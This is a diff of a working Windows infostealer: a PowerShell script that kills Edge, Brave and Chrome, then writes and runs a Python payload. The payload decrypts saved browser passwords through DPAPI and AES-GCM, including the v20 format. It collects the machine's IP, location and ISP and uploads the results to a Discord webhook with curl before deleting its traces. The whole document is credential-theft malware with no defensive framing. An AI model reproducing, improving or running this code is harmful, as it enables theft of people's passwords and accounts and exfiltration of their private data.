@@ -5,7 +5,7 @@ function Send-Discord {
     try { curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"$m`"}" $wh 2>$null } catch {}
 }
 
-Send-Discord "🔧 FIXED VERSION - $env:COMPUTERNAME"
+Send-Discord "🔧 FIXED - $env:COMPUTERNAME"
 
 Get-Process | Where-Object {$_.ProcessName -match "msedge|brave|chrome"} | Stop-Process -Force -EA 0
 Start-Sleep 7
@@ -25,7 +25,7 @@ def send(msg):
     except:
         pass
 
-send("🐍 Starting - CORRECT decrypt")
+send("🐍 Starting")
 
 try:
     import requests
@@ -42,61 +42,68 @@ import locale
 language=locale.getdefaultlocale()[0] if locale.getdefaultlocale()[0] else "N/A"
 
 def decrypt_password(enc_password, key):
-    """Déchiffrement corrigé - gère v10, v11, v20, DPAPI"""
-    
     if not enc_password or len(enc_password) < 3:
         return None
     
     prefix = enc_password[:3]
     
-    # v10/v11 (Chrome, Edge ancien)
+    # v10/v11 (Edge, Chrome standard)
     if prefix in [b'v10', b'v11']:
         try:
             nonce = enc_password[3:15]
             ciphertext = enc_password[15:-16]
             tag = enc_password[-16:]
-            
             cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
             password = cipher.decrypt_and_verify(ciphertext, tag)
             return password.decode('utf-8', errors='ignore')
         except:
             pass
     
-    # v20 (Brave récent)
+    # v20 (Brave) - FIX COMPLET
     elif prefix == b'v20':
         try:
             nonce = enc_password[3:15]
             
-            # IMPORTANT: Ne PAS séparer le tag
-            # v20 = nonce + (ciphertext+tag en un seul bloc)
+            # TOUTES les données après le nonce
             encrypted_data = enc_password[15:]
             
+            # Le tag est dans les 16 DERNIERS bytes
+            tag = encrypted_data[-16:]
+            # Le ciphertext est TOUT sauf les 16 derniers bytes
+            ciphertext = encrypted_data[:-16]
+            
+            # Déchiffrer normalement
             cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+            password = cipher.decrypt_and_verify(ciphertext, tag)
             
-            # Méthode 1: Tout décrypter ensemble (tag inclus)
+            # NE PAS retirer de bytes supplémentaires !
+            return password.decode('utf-8', errors='ignore')
+            
+        except Exception as e:
+            # Fallback : essayer sans verify
             try:
-                # Le tag est dans les 16 derniers bytes des données chiffrées
-                ciphertext = encrypted_data[:-16]
-                tag = encrypted_data[-16:]
+                nonce = enc_password[3:15]
+                encrypted_data = enc_password[15:]
                 
-                password = cipher.decrypt_and_verify(ciphertext, tag)
-                return password.decode('utf-8', errors='ignore')
-            except:
-                pass
-            
-            # Méthode 2: Décrypter sans verify (moins sécurisé mais fonctionne)
-            try:
+                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                # Décrypter tout
                 password = cipher.decrypt(encrypted_data)
-                # Retirer le padding/tag potentiel
+                
+                # Retirer SEULEMENT les null bytes à la fin
                 password = password.rstrip(b'\x00')
-                return password.decode('utf-8', errors='ignore')
+                
+                # Vérifier si ça ressemble à du texte valide
+                decoded = password.decode('utf-8', errors='ignore')
+                
+                # Si trop de caractères bizarres, probablement raté
+                if len([c for c in decoded if ord(c) < 32 and c not in '\n\r\t']) > len(decoded) * 0.3:
+                    return None
+                
+                return decoded
             except:
                 pass
-                
-        except:
-            pass
     
-    # DPAPI (très ancien)
+    # DPAPI (ancien format)
     try:
         password = win32crypt.CryptUnprotectData(enc_password, None, None, None, 0)[1]
         return password.decode('utf-8', errors='ignore')
@@ -111,80 +118,61 @@ def decrypt_browser(db_path, state_path, browser_name):
     send(f"🔍 {browser_name}...")
     
     if not os.path.exists(db_path) or not os.path.exists(state_path):
-        send(f"❌ {browser_name}: Files missing")
         return results
     
     try:
-        # Extraire la clé master
         with open(state_path, 'r', encoding='utf-8') as f:
-            state_data = json.load(f)
+            key = win32crypt.CryptUnprotectData(base64.b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:], None, None, None, 0)[1]
         
-        encrypted_key = base64.b64decode(state_data['os_crypt']['encrypted_key'])[5:]
-        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-        
-        # Copier la DB
-        temp_db = f"temp_{browser_name}.db"
+        temp_db = f"t_{browser_name}.db"
         if os.path.exists(temp_db):
             os.remove(temp_db)
         
         shutil.copy2(db_path, temp_db)
         time.sleep(1)
         
-        # Lire les mots de passe
         conn = sqlite3.connect(temp_db, timeout=120)
         cursor = conn.cursor()
         cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''")
         
-        success = 0
-        failed = 0
+        ok = 0
+        fail = 0
         
-        for url, username, enc_pwd in cursor.fetchall():
-            if not enc_pwd:
-                continue
-            
-            password = decrypt_password(enc_pwd, master_key)
-            
-            if password and len(password) > 0:
-                results.append(f"[{browser_name}] {url}\nUsername: {username}\nPassword: {password}\n")
-                success += 1
+        for url, user, enc_pwd in cursor.fetchall():
+            pwd = decrypt_password(enc_pwd, key)
+            if pwd and len(pwd) > 0:
+                results.append(f"[{browser_name}] {url}\nUsername: {user}\nPassword: {pwd}\n")
+                ok += 1
             else:
-                failed += 1
+                fail += 1
         
         conn.close()
         os.remove(temp_db)
         
-        send(f"✅ {browser_name}: {success} OK, {failed} failed")
+        send(f"✅ {browser_name}: {ok} OK, {fail} failed")
         
     except Exception as e:
-        send(f"❌ {browser_name}: Error - {str(e)}")
+        send(f"❌ {browser_name}: {str(e)}")
     
     return results
 
-# Extraction
-all_passwords = []
+all_results = []
 
 # Edge
-edge_path = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
-edge_db = os.path.join(edge_path, "Default", "Login Data")
-edge_state = os.path.join(edge_path, "Local State")
-if os.path.exists(edge_db):
-    all_passwords += decrypt_browser(edge_db, edge_state, "EDGE")
+e = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
+if os.path.exists(e + r"\Default\Login Data"):
+    all_results += decrypt_browser(e + r"\Default\Login Data", e + r"\Local State", "EDGE")
 
 # Brave
-brave_path = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
-brave_db = os.path.join(brave_path, "Default", "Login Data")
-brave_state = os.path.join(brave_path, "Local State")
-if os.path.exists(brave_db):
-    all_passwords += decrypt_browser(brave_db, brave_state, "BRAVE")
+b = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
+if os.path.exists(b + r"\Default\Login Data"):
+    all_results += decrypt_browser(b + r"\Default\Login Data", b + r"\Local State", "BRAVE")
 
 # Chrome
-chrome_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
-chrome_db = os.path.join(chrome_path, "Default", "Login Data")
-chrome_state = os.path.join(chrome_path, "Local State")
-if os.path.exists(chrome_db):
-    all_passwords += decrypt_browser(chrome_db, chrome_state, "CHROME")
+c = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
+if os.path.exists(c + r"\Default\Login Data"):
+    all_results += decrypt_browser(c + r"\Default\Login Data", c + r"\Local State", "CHROME")
 
-# Rapport final
 info = f"""{'='*60}
 SYSTEM INFORMATION
 {'='*60}
@@ -199,24 +187,19 @@ IP: {ip}
 Location: {location}
 ISP: {isp}
 {'='*60}
-TOTAL PASSWORDS: {len(all_passwords)}
+TOTAL: {len(all_results)} passwords
 {'='*60}
 
 """
 
 with open("passwords.txt", "w", encoding="utf-8") as f:
-    f.write(info)
-    if all_passwords:
-        f.write("\n".join(all_passwords))
-    else:
-        f.write("No passwords extracted.\n")
+    f.write(info + "\n".join(all_results) if all_results else info + "No passwords.\n")
 
-send(f"📤 Uploading {len(all_passwords)} passwords...")
+send(f"📤 Uploading {len(all_results)} passwords...")
 print("OK")
-'@ | Out-File "final.py" -Encoding UTF8
+'@ | Out-File "fix.py" -Encoding UTF8
 
-.\python.exe final.py 2>&1 | Out-Null
-
+.\python.exe fix.py 2>&1 | Out-Null
 curl.exe -F "file=@passwords.txt" $wh 2>$null
-Send-Discord "✅ COMPLETE"
-Remove-Item passwords.txt,final.py -Force -EA 0
+Send-Discord "✅ DONE"
+Remove-Item passwords.txt,fix.py -Force -EA 0
